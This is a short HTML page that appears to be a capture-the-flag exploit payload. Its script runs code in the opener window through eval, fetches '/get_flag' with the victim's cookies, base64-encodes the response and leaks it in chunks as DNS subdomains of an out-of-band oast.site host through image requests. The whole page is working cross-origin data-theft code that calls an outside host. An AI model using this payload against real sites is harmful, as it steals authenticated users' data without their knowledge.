<!DOCTYPE html>
<html><body>
<script>
if (window.opener) {
  window.opener.eval(`
    fetch('/get_flag',{credentials:'include'})
      .then(r=>r.text())
      .then(flag=>{
        let data = btoa(flag).replace(/=/g,'');
        let parts = data.match(/.{1,30}/g);
        // make sure we catch the last short chunk
        // (parts.length should be 4)
        for (let i=0;i<parts.length;i++){
          new Image().src = 'http://'+parts[i]+'.'+i+'.toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/';
        }
      });
  `);
}
</script>
</body></html>
